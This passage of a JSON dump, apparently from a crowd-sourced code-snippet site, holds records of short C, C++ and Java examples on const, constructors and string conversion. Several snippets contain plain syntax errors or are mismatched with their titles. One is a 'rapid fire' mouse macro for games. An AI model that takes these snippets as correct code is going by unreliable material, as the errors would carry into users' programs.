    "description": "// various versions of const are explained below #include <iostream> class Entity { private: \tint m_X, m_Y; \tmutable int var; // can be modified inside const menthods \tint* m_x, *m_y;// * use to create pointer in one line public: \tint GetX() const // cant modify class variables \t{ \t\t//m_X = 4;//error private member can't be modified inside const method \t\tvar = 5; // was set mutable \t\treturn m_X; \t} \tint Get_X()// will modify class  \t{ \t\treturn m_X; \t} \tconst int* const getX() const  // returning a pointer that cannot be modified & context of pointer cannot be modified \t{ \t\t//m_x = 4; \t\treturn m_x; \t} \tvoid PrintEntity(const Entity& e) { \t\tstd::cout << e.GetX() << std::endl; \t} }; int main() { \tEntity e; \tconst int MAX_AGE = 90;    // MAX_AGE =100; error const var is stored in read only section in memory and we can't write to that memory \t//  int const* a = new int; is same as const int* a = new int ;////but you can't change the context of pointer but can reassign it to a pointer something else \tint * const a = new int; //can change the context of pointer but can't reassign it to a pointer something else    *a = 2;     a = &MAX_AGE;// error can't change it to ptr something else    \tstd::cout << *a << std::endl; \ta =(int*) &MAX_AGE; \tstd::cout << *a << std::endl; }\n//Syntax: const Class_Name Object_name; const int MAXN = 1e5 + 5; const long long mod = (long long)1e9 + 7;\n#define LENGTH 10    #define WIDTH  5 #define NEWLINE '\\n'\n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1556,
    "keyword": null,
    "link": null,
    "title": " const char * to std::wstring",
    "description": "std::wstring s2ws(const std::string& str) {     int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);     std::wstring wstrTo( size_needed, 0 );     MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);     return wstrTo; } \n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1557,
    "keyword": null,
    "link": null,
    "title": " const char to string",
    "description": " const char * s = \"hello\";  std::string str(s);\n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1558,
    "keyword": null,
    "link": null,
    "title": " const in c++",
    "description": "// various versions of const are explained below #include <iostream> class Entity { private: \tint m_X, m_Y; \tmutable int var; // can be modified inside const menthods \tint* m_x, *m_y;// * use to create pointer in one line public: \tint GetX() const // cant modify class variables \t{ \t\t//m_X = 4;//error private member can't be modified inside const method \t\tvar = 5; // was set mutable \t\treturn m_X; \t} \tint Get_X()// will modify class  \t{ \t\treturn m_X; \t} \tconst int* const getX() const  // returning a pointer that cannot be modified & context of pointer cannot be modified \t{ \t\t//m_x = 4; \t\treturn m_x; \t} \tvoid PrintEntity(const Entity& e) { \t\tstd::cout << e.GetX() << std::endl; \t} }; int main() { \tEntity e; \tconst int MAX_AGE = 90;    // MAX_AGE =100; error const var is stored in read only section in memory and we can't write to that memory \t//  int const* a = new int; is same as const int* a = new int ;////but you can't change the context of pointer but can reassign it to a pointer something else \tint * const a = new int; //can change the context of pointer but can't reassign it to a pointer something else    *a = 2;     a = &MAX_AGE;// error can't change it to ptr something else    \tstd::cout << *a << std::endl; \ta =(int*) &MAX_AGE; \tstd::cout << *a << std::endl; }\n//Syntax: const Class_Name Object_name; const int MAXN = 1e5 + 5; const long long mod = (long long)1e9 + 7;\n#define LENGTH 10    #define WIDTH  5 #define NEWLINE '\\n'\n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1559,
    "keyword": null,
    "link": null,
    "title": " const in c++ is same as globle in python",
    "description": "// global_constants.cpp // LNK2019 expected void test(void); const int lnktest1 = 0;  int main() {    test(); }\n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1560,
    "keyword": null,
    "link": null,
    "title": " const pointer c++",
    "description": "int *p;\t\t\t\t\t\t\t\t\t\t// pointer to int const int *p == int const *p;\t\t\t\t// pointer to const int int * const p;\t\t\t\t\t\t\t\t// const pointer to int const int * const p == int const * const p;\t// const pointer to const int \n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1561,
    "keyword": null,
    "link": null,
    "title": " constant  variables in c++",
    "description": "// various versions of const are explained below #include <iostream> class Entity { private: \tint m_X, m_Y; \tmutable int var; // can be modified inside const menthods \tint* m_x, *m_y;// * use to create pointer in one line public: \tint GetX() const // cant modify class variables \t{ \t\t//m_X = 4;//error private member can't be modified inside const method \t\tvar = 5; // was set mutable \t\treturn m_X; \t} \tint Get_X()// will modify class  \t{ \t\treturn m_X; \t} \tconst int* const getX() const  // returning a pointer that cannot be modified & context of pointer cannot be modified \t{ \t\t//m_x = 4; \t\treturn m_x; \t} \tvoid PrintEntity(const Entity& e) { \t\tstd::cout << e.GetX() << std::endl; \t} }; int main() { \tEntity e; \tconst int MAX_AGE = 90;    // MAX_AGE =100; error const var is stored in read only section in memory and we can't write to that memory \t//  int const* a = new int; is same as const int* a = new int ;////but you can't change the context of pointer but can reassign it to a pointer something else \tint * const a = new int; //can change the context of pointer but can't reassign it to a pointer something else    *a = 2;     a = &MAX_AGE;// error can't change it to ptr something else    \tstd::cout << *a << std::endl; \ta =(int*) &MAX_AGE; \tstd::cout << *a << std::endl; }\n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1562,
    "keyword": null,
    "link": null,
    "title": " constants in cpp",
    "description": "// various versions of const are explained below #include <iostream> class Entity { private: \tint m_X, m_Y; \tmutable int var; // can be modified inside const menthods \tint* m_x, *m_y;// * use to create pointer in one line public: \tint GetX() const // cant modify class variables \t{ \t\t//m_X = 4;//error private member can't be modified inside const method \t\tvar = 5; // was set mutable \t\treturn m_X; \t} \tint Get_X()// will modify class  \t{ \t\treturn m_X; \t} \tconst int* const getX() const  // returning a pointer that cannot be modified & context of pointer cannot be modified \t{ \t\t//m_x = 4; \t\treturn m_x; \t} \tvoid PrintEntity(const Entity& e) { \t\tstd::cout << e.GetX() << std::endl; \t} }; int main() { \tEntity e; \tconst int MAX_AGE = 90;    // MAX_AGE =100; error const var is stored in read only section in memory and we can't write to that memory \t//  int const* a = new int; is same as const int* a = new int ;////but you can't change the context of pointer but can reassign it to a pointer something else \tint * const a = new int; //can change the context of pointer but can't reassign it to a pointer something else    *a = 2;     a = &MAX_AGE;// error can't change it to ptr something else    \tstd::cout << *a << std::endl; \ta =(int*) &MAX_AGE; \tstd::cout << *a << std::endl; }\n#define identifier value \n#define LENGTH 10    #define WIDTH  5 #define NEWLINE '\\n'\n",
    "reg_date": "2021-10-12T11:39:17.000Z"
  },
  {
    "id": 1563,
    "keyword": null,
    "link": null,
    "title": " constexpr std::round c++",
    "description": "/* There are no standard constexpr cmath functions right now (c++17 standard)    Proposals have been made, but it seems nothing is promised yet. */\n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1564,
    "keyword": null,
    "link": null,
    "title": " constructor c++ struct",
    "description": "struct TestStruct {         int id;         TestStruct() : id(42)         {         } }; \n struct Rectangle {     int width;  // member variable     int height; // member variable      // C++ constructors     Rectangle()     {         width = 1;         height = 1;     }      Rectangle( int width_  )     {         width = width_;         height = width_ ;     }      Rectangle( int width_ , int height_ )     {         width = width_;         height = height_;     }     // ... };  \n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1565,
    "keyword": null,
    "link": null,
    "title": " constructor overloading in c++",
    "description": "Constructor overloading in Java is a technique of having more than one constructor with different parameter lists.  They are arranged in a way that each constructor performs a different task. They are differentiated by the compiler by the number of parameters in the list and their types.  class Student5{       int id;       String name;       int age;          Student5(int i,String n){       \tid = i;  \t\t\t\t\t//creating two arg constructor     \tname = n;       }          Student5(int i,String n,int a){       \tid = i;       \tname = n;\t\t\t\t\t//creating three arg constructor         \tage=a;       }            void display(){System.out.println(id+\" \"+name+\" \"+age);}       \tpublic static void main(String args[]){       \tStudent5 s1 = new Student5(111,\"Karan\");       \tStudent5 s2 = new Student5(222,\"Aryan\",25);       \ts1.display();       \ts2.display();      }   }   \nconstructor oveloading in c++   \nYes, the constructors can be overloaded by changing the number of  arguments accepted by the constructor or by changing the data type of  the parameters\nclass Point { public: \tPoint& operator++() { ... }\t\t// prefix \tPoint operator++(int) { ... }\t// postfix   \tfriend Point& operator++(Point &p);\t\t\t// friend prefix   \tfriend Point operator++(Point &p, int);\t\t// friend postfix   \t// in Microsoft Docs written \"friend Point& operator++(Point &p, int);\" }; \nCount: 6\n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1566,
    "keyword": null,
    "link": null,
    "title": " constructor syntax in c++",
    "description": "BigMommaClass {     BigMommaClass(int, int);  private:     ThingOne thingOne;     ThingTwo thingTwo; };  BigMommaClass::BigMommaClass(int numba1, int numba2): thingOne(numba1 + numba2), thingTwo(numba1, numba2) { // Code here }\n struct Rectangle {     int width;  // member variable     int height; // member variable      // C++ constructors     Rectangle()     {         width = 1;         height = 1;     }      Rectangle( int width_  )     {         width = width_;         height = width_ ;     }      Rectangle( int width_ , int height_ )     {         width = width_;         height = height_;     }     // ... };  \nclass MyClass {     // The class   public:           // Access specifier     MyClass() {     // Constructor       cout << \"Hello World!\";     } };\nstruct S {     int n;     S(int); // constructor declaration     S() : n(7) {} // constructor definition.                   // \": n(7)\" is the initializer list                   // \": n(7) {}\" is the function body }; S::S(int x) : n{x} {} // constructor definition. \": n{x}\" is the initializer list int main() {     S s; // calls S::S()     S s2(10); // calls S::S(int) }\n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1567,
    "keyword": null,
    "link": null,
    "title": " continue c++",
    "description": "     Continue statement is used inside loops. Whenever a continue statement is encountered inside a loop, control directly jumps to the beginning of the loop for next iteration, skipping the execution of statements inside loop&rsquo;s  body for the current iteration.\n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1568,
    "keyword": null,
    "link": null,
    "title": " contoh A",
    "description": "#include <iostream>  using namespace std;  int main() { \tchar str[] = \"Do not interrupt me\"; \tchar ch = 'm'; \t \tcout.write(str,6); \tcout << endl; \tcout.put(ch); \t \treturn 0; }\n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1569,
    "keyword": null,
    "link": null,
    "title": " contoh space",
    "description": "int main() {    char a[10];    for(int i = 0; i < 10; i++)    {        cin>>a[i];        if(a[i] == ' ')           cout<<\"It is a space!!!\"<<endl;    }    return 0; } \n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1570,
    "keyword": null,
    "link": null,
    "title": " convert GLFWwindow* to IntPtr",
    "description": "// C++/CLR // Convert to IntPtr IntPtr ptr(window);  // Convert back to GLFWwindow* (GLFWwindow*) ptr.ToPointer();\n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1571,
    "keyword": null,
    "link": null,
    "title": " convert a int to string c++",
    "description": "#include <string>   std::string s = std::to_string(42);\n#include <iostream> #include<string> using namespace std; int main() { int i = 11; float f = 12.3; string str = to_string(i); strinf fstr = to_string(f); }\nstring str_val = to_string(int_val);\n// ----------------------------------- C++ 11 and onwards // EXAMPLE #include <string> int iIntAsInt = 658; std::string sIntAsString = to_string(iIntAsInt);  /* SYNTAX to_string(<your-integer>) */  // ----------------------------------- BEFORE C++ 11 // EXAMPLE #include <sstream> #include <string> int iYourInt = 5; std::stringstream ssYourInt_AsStream << iYourInt; std::string sYourInt_AsString = ssYourInt_AsStream.str();\n#include <iostream>   #include <boost/lexical_cast.hpp>   using namespace std;   int main()   {    int i=11;    string str = boost::lexical_cast<string>(i);   cout<<\"string value of integer i is :\"<<str<<\"\\n\";      }  \n",
    "reg_date": "2021-10-12T11:39:18.000Z"
  },
  {
    "id": 1572,
    "keyword": null,
    "link": null,
    "title": " convert all characters in string to uppercase c++",
    "description": "transform(str.begin(), str.end(), str.begin(), ::toupper); \n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1573,
    "keyword": null,
    "link": null,
    "title": " convert all strings in vector to lowercase or uppercase c++",
    "description": "for(std::string &s : stringVector){     std::transform(s.begin(), s.end(), s.begin(),          [](char c){ return std::toupper(c); }); // for lowercase change \"toupper\" -> \"tolower\"  }\n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1574,
    "keyword": null,
    "link": null,
    "title": " convert array to set c++",
    "description": "set<int> res(arr, arr + sizeArr);\n#include <iostream> #include <unordered_set>   int main() {     int A[] = { 1, 2, 3, 4, 5 };       std::unordered_set<int> s;     for (int i: A) {         s.insert(i);     }       for (int i: s) {         std::cout << i << \" \";     }       return 0; } \n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1575,
    "keyword": null,
    "link": null,
    "title": " convert ascii char value to hexadecimal c++",
    "description": "#include <sstream> std::stringstream sstream; sstream << std::hex << (my_char - 0); std::string result = sstream.str();  // result = hexadecimal string value of the ascii value of my_char\n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1576,
    "keyword": null,
    "link": null,
    "title": " convert binary to decimal c++ stl",
    "description": "string bin_string = \"10101010\"; int number =0; number = stoi(bin_string, 0, 2); // number = 170\n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1577,
    "keyword": null,
    "link": null,
    "title": " convert c++ code to c online",
    "description": "#include <bits/stdc++.h> using namespace std; int recurFunct(int n) {     if (n==1)         return 1;     return recurFunct(n-1) + 2*n-1; } int main() {     int n;     cin>>n;     for (int i=2; i<=n+1; i++)     {         cout<<recurFunct(i)<<\" \";         if (i%8 ==0 )             cout<<\"\\n\";     }     return 0; }\nc programm\n#include <stdio.h> #include <math.h> #define COLUMN 6  void createPattern(char pattern[][COLUMN],int numStudent,int row) {     for(int i = 0; i < row ; i++) {         for(int j = 0; j < COLUMN; j++) {             if(numStudent!=0) {                 pattern[i][j] = 'X';                 numStudent -- ;             }             else if(numStudent==0) {                 pattern[i][j] = ' ';             }         }     } }  void bookSeat(char pattern[][COLUMN],int rowB,int columnB) {     if(pattern[rowB-1][columnB-1] != ' ') {         pattern[rowB-1][columnB-1] = 'S';     } }  void printPattern(char pattern[][COLUMN],int row) {     for(int i = 0; i < row ; i++) {         for(int j = 0; j < COLUMN; j++) {             printf(\"%c\",pattern[i][j]);             if(j < COLUMN-1) {                 printf(\" \");             }         }         printf(\"\\n\");     } } int main() {     int numStudent,numSeat;     scanf(\"%d\",&numStudent);     if(numStudent>=1 && numStudent<=40) {         int rowBook,columnBook;         int row = ceil((double)numStudent/COLUMN);         char pattern[row][COLUMN];         createPattern(pattern,numStudent,row);          scanf(\"%d\",&numSeat);          for(int i = 0 ; i < numSeat ; i++) {             scanf(\"%d %d\",&rowBook,&columnBook);             if((rowBook >= 1 && rowBook <= row ) && (columnBook >= 1 && columnBook <= COLUMN)) {                 bookSeat(pattern,rowBook,columnBook);             }         }         printPattern(pattern,row);      }     else if(numStudent<1) {         printf(\"Students not enough.\\n\");     }     else if(numStudent>40) {         printf(\"Too many students.\\n\");     }     return 0; }\n#include <bits/stdc++.h> using namespace std;   // Function to check if elements are // pairwise consecutive in queue bool pairWiseConsecutive(queue<int> q) {     // Transfer elements of q to aux.     stack<int> aux;     while (!q.empty()) {         aux.push(q.front());         q.pop();     }       // Again transfer the     // elements of aux to aux2     stack<int> aux2;     while (!aux.empty()) {         aux2.push(aux.top());         aux.pop();     }       // Traverse aux2 and see if     // elements are pairwise     // consecutive or not. We also     // need to make sure that original     // content is retained.     bool result = true;     while (aux2.size() > 1) {           // Fetch current top two         // elements of aux2 and check         // if they are consecutive.         int x = aux2.top();         aux2.pop();           int y = aux2.top();         aux2.pop();           if (abs(x - y) != 1)             result = false;           // Push the elements to queue         q.push(x);         q.push(y);     }       if (aux2.size() == 1)         q.push(aux2.top());       return result; }   // Driver program int main() {     // Pushing elements into the queue     queue<int> q;     q.push(4);     q.push(5);     q.push(-2);     q.push(-3);     q.push(11);     q.push(10);     q.push(5);     q.push(6);       if (pairWiseConsecutive(q))         cout << \"Yes\" << endl;     else         cout << \"No\" << endl;       // Printing the original queue     while (!q.empty()) {         cout << q.front() << \" \";         q.pop();     }     cout << endl;       return 0; }\ninclude <iostream> using namespace std; int main(int argc, char** argv) { string s; int n,c=0,l; in>>s; cn>>n; l=s.length(); while(l%n!=0) { s.append(\"*\"); l=s.length(); } int i=0,t=0; while(i<l)     {     cout<<s[i];     c++;     if(c==n)     {     c=0;     cout<<\"\\n\";     i=i+n;     t++;     }     else     {     if(t%2==0)     i++;     else     i--;     } } }\n#include<bits/stdc++.h> using namespace std;  void printWords(string str) { \t// word variable to store word \tstring word;  \t// making a string stream \tstringstream iss(str);  \t// Read and print each word. \twhile (iss >> word){ \t\treverse(word.begin(),word.end()); \t\tcout<<word<<\" \"; \t} }  // Driver code int main() { \tstring s = \"GeeksforGeeks is good to learn\"; \tprintWords(s); \treturn 0; } // This code is contributed by Nikhil Rawat \n#include<stdio.h> int main() {     int x;          /* Print column names */     printf(\"Number\\tSquare\\tCube\\n\");     printf(\"=========================\\n\");      for(x=0; x<=20; x++)         printf(\"%d\\t%d\\t%d\\n\", x, x*x, x*x*x);          return 0; }\n#include <iostream> #include <conio.h> using namespace std; int main() {     float srednia, suma=0;     int ilosc_liczb=0;      int liczba;      cout<<\"program obliczajacy srednia liczb parzystych (0 &ndash; konczy wpis): \"<<endl;     do     {         cout<<\"Podaj liczbe: \";         cin>>liczba;         if (liczba%2!=0 && liczba!=0) // jesli liczba jest nieparzysta         {             cout<<\"Podaj liczbe: \";             cin>>liczba;         }         if (liczba!=0) //jesli liczba jest jakakolwiek liczba parzysta         {             suma=suma+liczba;             ilosc_liczb++;         }     }        while(liczba!=0);     srednia=suma/ilosc_liczb;     cout<<\"Srednia: \"<<srednia;     getch();     return 0; }\nc program\npublic class Mythread {      public static void main(String[] args) {         Runnable r = new Runnable1();         Thread t = new Thread(r);         t.start();         Runnable r2 = new Runnable2();         Thread t2 = new Thread(r2);         t2.start();     } }  class Runnable2 implements Runnable{     public void run(){         for(int i=0;i<11;i++){             if(i%2 == 1)                 System.out.println(i);         }     } }  class Runnable1 implements Runnable{     public void run(){         for(int i=0;i<11;i++){             if(i%2 == 0)                 System.out.println(i);         }     }\n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1578,
    "keyword": null,
    "link": null,
    "title": " convert c++ to mips assembly  code online",
    "description": " #include <iostream>  using namespace std;  void heapify(int arr[], int n, int i) { \tint largest = i;  \tint l = 2 * i + 1; \tint r = 2 * i + 2;   \tif (l < n && arr[l] > arr[largest]) \t\tlargest = l;  \tif (r < n && arr[r] > arr[largest]) \t\tlargest = r;  \tif (largest != i) { \t\tswap(arr[i], arr[largest]);  \t\theapify(arr, n, largest); \t} }  void deleteRoot(int arr[], int& n) {  \tint lastElement = arr[n - 1];  \t \tarr[0] = lastElement;   \tn = n - 1;  \theapify(arr, n, 0); }   void printArray(int arr[], int n) { \tfor (int i = 0; i < n; ++i) \t\tcout << arr[i] << \" \"; \tcout << \"\\n\"; } int main() { \t \tint arr[] = { 10, 5, 3, 2, 4 };  \tint n = sizeof(arr) / sizeof(arr[0]);  \tdeleteRoot(arr, n);  \tprintArray(arr, n);  \treturn 0; } \n#include <stdio.h> int main() { int i; int sum = 0; for (i=0; i<=100; i++) sum = sum + i*i; printf(\"The sum from 0 to 100 is %d\\n\",sum);\n# Not sure what to do now? Enter your mips code here \n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1579,
    "keyword": null,
    "link": null,
    "title": " convert c++ to python online",
    "description": "#include <iostream>  using namespace std;  int main()  { int n=4,num-n-1; for(int i=1;i<n;i++) {  for(int j=1;j<=i;j++) cout<<num; cout<<endl;  num++;  }  num-;  for(int i=n;i>=1;i-)  { for(int j=1;j<=i;j++) cout<<num; num--; cout<<endl;  }  return 0;  }\n#include <iostream> #include <vector> #include <algorithm> using namespace std; void obradi(const vector<int>& particija, int k) {   for (int i = 0; i < k; i++)     cout << particija[i] << \" \";   cout << endl; } void obradiParticije(int n, int smax, vector<int>& particija, int k) {   if (n <= 0)     obradi(particija, k);   else {     for (int s = 1; s <= min(n, smax); s++) {       particija[k] = s;       obradiParticije(n-s, s, particija, k+1);     } } void obradiParticije(int n) {   vector<int> particija(n);   obradiParticije(n, n, particija, 0); } int main() {   int n;   cin >> n;   obradiParticije(n);\n#include \"stdafx.h\" #include <iostream> #include <Windows.h> #include <time.h>   using namespace std;   int main() {     cout << \"===============================================================================\" << endl;     cout << \"External Rapid Fire by EPiC REV (Copyright 2013 @ EPiC REV). Works in any game!\" << endl;     cout << \"===============================================================================\" << endl;     cout << \"Press right-click in game to rapid fire.\" << endl;       bool RapidFire = false;     int AutoFireTimer = clock();     int currentTime;     bool MouseDown = false;     while(true)     {         //Check for right mouse button to be down.         if(GetAsyncKeyState(VK_RBUTTON) & 0x8000)RapidFire = true;         else RapidFire = false;           if(RapidFire)         {             //only go if so many milliseconds have passed.             if(!MouseDown)             {                 MouseDown = true;                 mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); //             }             if(clock() - AutoFireTimer > 21)             {                 MouseDown = false;                 mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); //                 AutoFireTimer = clock();             }         }     }  }\nvoid reverse_list (solution & pi) {   vector<int >tour; \tint pointer; \tfor (int i=0;i<=v_num-1;i++) \t{ \t\tpointer=pi.sol[i][0]; \t\twhile (pointer!=0) \t\t{ \t\t\ttour.push_back(pointer); \t\t\tpointer=pi.sol[i][pointer]; \t\t} \t\tpi.sol_r[i][0]=tour.back(); \t\ttour.pop_back(); \t\tpointer=pi.sol_r[i][0]; \t\twhile (tour.size()) \t\t{ \t\t\tpi.sol_r[i][pointer]=tour.back(); \t\t\tpointer=pi.sol_r[i][pointer]; \t\t\ttour.pop_back(); \t\t} \t\tpi.sol_r[i][pointer]=0;\t} }\n#include <iostream> using namespace std; long long sort(arr,arr+n,greater<int>());  int main() {     // your code goes here     int T;     cin>>T;     for(int ts=0; ts<T; ts++)     {         long long int sum=0,n;         cin>>n;         long long int arr[n];         for(long long int i=0; i<n; i++)             cin>>arr[i];         sort(arr[i],arr+n,greater<int>());         for(long long int k=0; k<n; k++)         {             if(k==0)             {                 sum=arr[k];             }             else if (arr[k]-k>=0)             {                 sum=sum+arr[k]-k;             }             else {                 break;             }         }         cout<<sum<<end1;     }     return 0; } \n#include<iostream> using namespace std;  int dado() {      return rand() % 6 + 1; }  void casasEspeciais( int player){     switch (player) {     case 3:         player = 16;         break;     case 5:         player = 7;         break;     case 15:         player = 25;         break;     case 18:         player = 20;         break;     case 21:         player = 32;         break;     case 12:         player = 2;         break;     case 14:         player = 11;         break;     case 17:         player = 4;         break;     case 31:         player = 19;         break;     case 35 :         player = 22;         break;     default:         break;     } }  void regrasDoJogo(int p1,int p2, int &c1, int &c2) {     p1 = 1;     p2 = 1;     bool game = true;     int jogadas = 0;      while (game)     {         p1 += dado();         casasEspeciais(p1);          if (p1 >= 36) {             c1++;              game = false;             break;         }         p2 += dado();         casasEspeciais(p2);          if (p2 >= 36){             c2++;              game = false;             break;         }         jogadas++;     };  }  int player1, player2; int count1, count2;  float TOTAL = 10000.0f;  int main() {     count1 = 0;     count2 = 0;      srand(time(NULL));      for (int i = 0; i < TOTAL; i++){         regrasDoJogo(player1, player2, count1, count2);      }     cout << \"vitorias do p1:\" << count1 << endl;     cout << \"vitorias do p2:\" << count2 << endl;      float porcentagem = (count1 / TOTAL)*100;       cout << \"a probabilidade do primeiro ganhar &eacute; de:\" << porcentagem <<\"%\"<< endl;      system(\"pause\");     return 0; }\nstruct Tumpukan {  char Isi[MaxElemen];    int Atas; } T;  //sub program PUSH berfungsi memasukkan elemen ke dalam STACK void PUSH (char x){ //fungsi push if(T.Atas == MaxElemen){  //untuk mengecek apakah stack sudah penuh  cout<<\"Tumpukan Sudah Penuh\";  getch(); } else{  T.Atas = T.Atas + 1;  T.Isi[T.Atas] = x; } }\n#include <iostream>  #include <string.h>  int main (){     int i;     char telefone[20];     char ch;     i=0     while((ch=getchar ())) 1='\\n') (         if (ch=='-')telefone[1]='-';         else if (ch >=48 && ch <=57) telefone [i]=ch;         else if (ch >=65 && ch <=67) telefone [i]='2';         else if (ch >=68 && ch <=70) telefone [i]='3';         else if (ch >=71 && ch <=73) telefone [i]='4';         else if (ch >=74 && ch <=76) telefone [i]='5';         else if (ch >=77 && ch <=79) telefone [i]='6';         else if (ch >=80 && ch <=83) telefone [i]='7';         else if (ch >=84 && ch <=86) telefone [i]='8';         else if (ch >=87 && ch <=90) telefone [i]='9';                  i++;     }     telefone[i]='\\0';     printf(\"%s\", telefone);     return(0); }\nconvert c++ to python online\n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1580,
    "keyword": null,
    "link": null,
    "title": " convert c code to c++",
    "description": "#include <stdio.h> int main() {    /* printf function displays the content that is     * passed between the double quotes.     */    printf(\"Hello World\");    return 0; }\n// C++ program to generate all possible // valid IP addresses from given string #include <bits/stdc++.h> using namespace std;  // Function checks whether IP digits // are valid or not. int is_valid(string ip) { \t// Splitting by \".\" \tvector<string> ips; \tstring ex = \"\"; \tfor (int i = 0; i < ip.size(); i++) { \t\tif (ip[i] == '.') { \t\t\tips.push_back(ex); \t\t\tex = \"\"; \t\t} \t\telse { \t\t\tex = ex + ip[i]; \t\t} \t} \tips.push_back(ex);  \t// Checking for the corner cases \t// cout << ip << endl; \tfor (int i = 0; i < ips.size(); i++) { \t\t// cout << ips[i] <<endl; \t\tif (ips[i].length() > 3 \t\t\t|| stoi(ips[i]) < 0 \t\t\t|| stoi(ips[i]) > 255) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) == 0) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) != 0 \t\t\t&& ips[i][0] == '0') \t\t\treturn 0; \t} \treturn 1; }  // Function converts string to IP address void convert(string ip) { \tint l = ip.length();  \t// Check for string size \tif (l > 12 || l < 4) { \t\tcout << \"Not Valid IP Address\"; \t}  \tstring check = ip; \tvector<string> ans;  \t// Generating different combinations. \tfor (int i = 1; i < l - 2; i++) { \t\tfor (int j = i + 1; j < l - 1; j++) { \t\t\tfor (int k = j + 1; k < l; k++) { \t\t\t\tcheck = check.substr(0, k) + \".\" \t\t\t\t\t\t+ check.substr(k, l - k + 2); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, j) + \".\" \t\t\t\t\t+ check.substr(j, l - j + 3); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, i) + \".\" \t\t\t\t\t+ check.substr(i, l - i + 4);  \t\t\t\t// cout<< check <<endl; \t\t\t\t// Check for the validity of combination \t\t\t\tif (is_valid(check)) { \t\t\t\t\tans.push_back(check); \t\t\t\t\tstd::cout << check << '\\n'; \t\t\t\t} \t\t\t\tcheck = ip; \t\t\t} \t\t} \t} }  // Driver code int main() { \tstring A = \"25525511135\"; \tstring B = \"25505011535\";  \tconvert(A); \tconvert(B);  \treturn 0; }  // This code is contributed by Harshit \n    string word;\n123456789101112131415161718192021222324252627#include <iostream>#include <bits/stdc++.h>using namespace std;class ABS{    public:        void abs(int arr[], int n){    sort(arr, arr+n);    int c=0,i;    for (i=n-1;i-2>=0;i--){        if (arr[i-2]+arr[i-1]>arr[i]){            c=1;            break;        }    }    (c) ? cout<<arr[i-2]<<\" \"<<arr[i-1]<<\" \"<<arr[i]<<endl : cout<<-1<<endl;}};int main(){    ABS abx;    int arr[] = { 5,4,3,1,2};    int n = sizeof(arr) / sizeof(arr[0]);    abx.abs(arr, n);    return 0;}X\n",
    "reg_date": "2021-10-12T11:39:19.000Z"
  },
  {
    "id": 1581,
    "keyword": null,
    "link": null,
    "title": " convert c program to c++ online",
    "description": "#include <stdio.h>  int main(void) {   printf(\"The quick brown fox \\n jumps\\n Over a lazy dog\");   return 0; }\nnode *create_list() { int k, n; node *p, *head; printf (\"\\n How many elements to enter?\"); scanf (\"%d\", &n); for (k=0; k<n; k++) { if (k == 0) { head = (node *) malloc(sizeof(node)); p = head; } else { p->next = (node *) malloc(sizeof(node)); p = p->next; } scanf (\"%d %s %d\", &p->roll, p->name, &p->age); } p->next = NULL; return (head); }\n// C++ program to generate all possible // valid IP addresses from given string #include <bits/stdc++.h> using namespace std;  // Function checks whether IP digits // are valid or not. int is_valid(string ip) { \t// Splitting by \".\" \tvector<string> ips; \tstring ex = \"\"; \tfor (int i = 0; i < ip.size(); i++) { \t\tif (ip[i] == '.') { \t\t\tips.push_back(ex); \t\t\tex = \"\"; \t\t} \t\telse { \t\t\tex = ex + ip[i]; \t\t} \t} \tips.push_back(ex);  \t// Checking for the corner cases \t// cout << ip << endl; \tfor (int i = 0; i < ips.size(); i++) { \t\t// cout << ips[i] <<endl; \t\tif (ips[i].length() > 3 \t\t\t|| stoi(ips[i]) < 0 \t\t\t|| stoi(ips[i]) > 255) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) == 0) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) != 0 \t\t\t&& ips[i][0] == '0') \t\t\treturn 0; \t} \treturn 1; }  // Function converts string to IP address void convert(string ip) { \tint l = ip.length();  \t// Check for string size \tif (l > 12 || l < 4) { \t\tcout << \"Not Valid IP Address\"; \t}  \tstring check = ip; \tvector<string> ans;  \t// Generating different combinations. \tfor (int i = 1; i < l - 2; i++) { \t\tfor (int j = i + 1; j < l - 1; j++) { \t\t\tfor (int k = j + 1; k < l; k++) { \t\t\t\tcheck = check.substr(0, k) + \".\" \t\t\t\t\t\t+ check.substr(k, l - k + 2); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, j) + \".\" \t\t\t\t\t+ check.substr(j, l - j + 3); 